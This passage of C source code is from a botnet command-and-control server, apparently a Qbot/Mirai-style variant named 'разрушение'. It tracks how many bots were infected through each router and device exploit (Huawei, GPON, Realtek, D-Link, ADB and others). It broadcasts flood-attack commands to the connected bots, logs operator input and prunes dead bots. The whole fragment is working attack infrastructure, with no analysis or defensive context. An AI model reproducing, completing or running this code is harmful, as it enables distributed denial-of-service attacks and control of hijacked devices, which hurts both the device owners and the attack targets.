            if (send(datafd, sparc, strlen(sparc), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, arc, strlen(arc), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, unk, strlen(unk), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strncmp(buf, "c", 1) == 0 || strncmp(buf, "CLS", 3) == 0 || strncmp(buf, "cls", 3) == 0 ||
            strncmp(buf, "CLEAR", 5) == 0) {
            if (send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        }

       if (strncmp(buf, "ep", 2) == 0) {
            char huawei[128];
            char linksys[128];
            char tenda[128];
            char gpon8080[128];
            char gpon80[128];
            char gpon443[128];
            char uchttpd[128];
            char coap[128];
            char adb[128];
            char realtek[128];
            char dlink[128];
            char total[128];

         
            sprintf(huawei, "\033[1;31mhuawei   \033[1;36m~>\033[1;31m %d\r\n", huaweiConnected());
            sprintf(linksys, "\033[1;31mlinksys  \033[1;36m~>\033[1;31m %d\r\n", linksysConnected());
            sprintf(tenda, "\033[1;31mtenda    \033[1;36m~>\033[1;31m %d\r\n", tendaConnected());
            sprintf(gpon8080, "\033[1;31mgpon8080 \033[1;36m~>\033[1;31m %d\r\n", gpon8080Connected());
            sprintf(gpon80, "\033[1;31mgpon80   \033[1;36m~>\033[1;31m %d\r\n", gpon80Connected());
            sprintf(gpon443, "\033[1;31mgpon443  \033[1;36m~>\033[1;31m %d\r\n", gpon443Connected());
            sprintf(uchttpd, "\033[1;31muchttpd  \033[1;36m~>\033[1;31m %d\r\n", uchttpdConnected());
            sprintf(coap, "\033[1;31mCOAP     \033[1;36m~>\033[1;31m %d\r\n", coapConnected());
            sprintf(realtek, "\033[1;31mrealtek  \033[1;36m~>\033[1;31m %d\r\n", realtekConnected());
            sprintf(dlink, "\033[1;31mdlink    \033[1;36m~>\033[1;31m %d\r\n", dlinkConnected());
            sprintf(adb, "\033[1;31madb      \033[1;36m~>\033[1;31m %d\r\n", adbConnected());
            sprintf(total, "\033[1;31mtotal    \033[1;36m~>\033[1;31m %d\r\n", BotsConnected());
            if (send(datafd, huawei, strlen(huawei), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, linksys, strlen(linksys), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, tenda, strlen(tenda), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, gpon8080, strlen(gpon8080), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, gpon80, strlen(gpon80), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, gpon443, strlen(gpon443), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, uchttpd, strlen(uchttpd), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, coap, strlen(coap), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, realtek, strlen(realtek), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, dlink, strlen(dlink), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, adb, strlen(adb), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
        }
         
  
          if(strstr(buf, "!* T")) {
                pthread_create(&title, NULL, &TitleWriter, sock);

            
                char help1  [120];
            
                sprintf(help1,  "\r\n\e[1;31mattack send with\033[1;36m$\033[1;36m%d\033[1;31m bots\033[1;31m\033[1;31m from user$\033[1;36m%s\033[1;36m\033[1;37m\r\n", BotsConnected(), usernamez);
                
                if(send(datafd, help1,  strlen(help1
                    ),  MSG_NOSIGNAL) == -1) goto end;
            }

           if(strstr(buf, "!* U")) {
                pthread_create(&title, NULL, &TitleWriter, sock);

            
                char help2  [120];
            
                sprintf(help2,  "\r\n\e[1;31mattack send with\033[1;36m$\033[1;36m%d\033[1;31m bots\033[1;31m\033[1;31m from user$\033[1;36m%s\033[1;36m\033[1;37m\r\n", BotsConnected(), usernamez);
                
                if(send(datafd, help2,  strlen(help2
                    ),  MSG_NOSIGNAL) == -1) goto end;
            }
           if(strstr(buf, "!* S")) {
                pthread_create(&title, NULL, &TitleWriter, sock);

            
                char help3  [120];
            
                sprintf(help3,  "\r\n\e[1;31mattack send with\033[1;36m$\033[1;36m%d\033[1;31m bots\033[1;31m\033[1;31m from user$\033[1;36m%s\033[1;36m\033[1;37m\r\n", BotsConnected(), usernamez);
                
                if(send(datafd, help3,  strlen(help3
                    ),  MSG_NOSIGNAL) == -1) goto end;

}
      if(strstr(buf, "!* O")) {
                pthread_create(&title, NULL, &TitleWriter, sock);

            
                char help4  [120];
            
                sprintf(help4,  "\r\n\e[1;31mattack send with\033[1;36m$\033[1;36m%d\033[1;31m bots\033[1;31m\033[1;31m from user$\033[1;36m%s\033[1;36m\033[1;37m\r\n", BotsConnected(), usernamez);
                
                if(send(datafd, help4,  strlen(help4
                    ),  MSG_NOSIGNAL) == -1) goto end;
            }
       
      if(strstr(buf, "!* H")) {
                pthread_create(&title, NULL, &TitleWriter, sock);

            
                char help5  [120];
            
                sprintf(help5,  "\r\n\e[1;31mattack send with\033[1;36m$\033[1;36m%d\033[1;31m bots\033[1;31m\033[1;31m from user$\033[1;36m%s\033[1;36m\033[1;37m\r\n", BotsConnected(), usernamez);
                
                if(send(datafd, help5,  strlen(help5
                    ),  MSG_NOSIGNAL) == -1) goto end;
            }
       



        trim(buf);
        char input[5000];
        sprintf(input, "\033[1;31m%s\033[1;36m@\033[1;31mразрушение\033[1;36m$\033[1;31m%d\033[1;36m~#\033[1;37m ", usernamez, BotsConnected());
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        if (strlen(buf) == 0) continue;
         printf("%s: \"%s\"\n",accounts[find_line].username, buf);

                FILE *LogFile;
                LogFile = fopen("s.log", "a");
                time_t now;
                struct tm *gmt;
                char formatted_gmt [50];
                char lcltime[50];
                now = time(NULL);
                gmt = gmtime(&now);
                strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf); //LogFiles
                fclose(LogFile);
                broadcast(buf, datafd, accounts[find_line].username);
                memset(buf, 0, 2048);
    }

    end:
    managements[datafd].connected = 0;
    close(datafd);
    OperatorsConnected--;
}

void *BotListener(int port) {
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *) newsockfd);
    }
}

int main(int argc, char *argv[], void *sock) {
    signal(SIGPIPE, SIG_IGN);
    int s, threads, port;
    struct epoll_event event;
    if (argc != 4) {
        fprintf(stderr, "Usage ~> screen ./%s <BOT-PORT> <THREADS> <CNC-PORT>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    port = atoi(argv[3]);
    threads = atoi(argv[2]);
    printf("\033[1;36m[\033[1;31mразрушение CNC has Been Screened\033[1;36m]\n");
    listenFD = create_and_bind(argv[1]);
    if (listenFD == -1) abort();
    s = make_socket_non_blocking(listenFD);
    if (s == -1) abort();
    s = listen(listenFD, SOMAXCONN);
    if (s == -1) {
        perror("listen");
        abort();
    }
    epollFD = epoll_create1(0);
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }
    pthread_t thread[threads + 2];
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
    }
    pthread_create(&thread[0], NULL, &BotListener, port);
    while (1) {
        broadcast("PING", -1, "разрушение");
        printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Removing Dead Bots \033[1;36m[\033[1;31m60s\033[1;36m]\n");
        sleep(60);
    }
    close(listenFD);
    return EXIT_SUCCESS;
}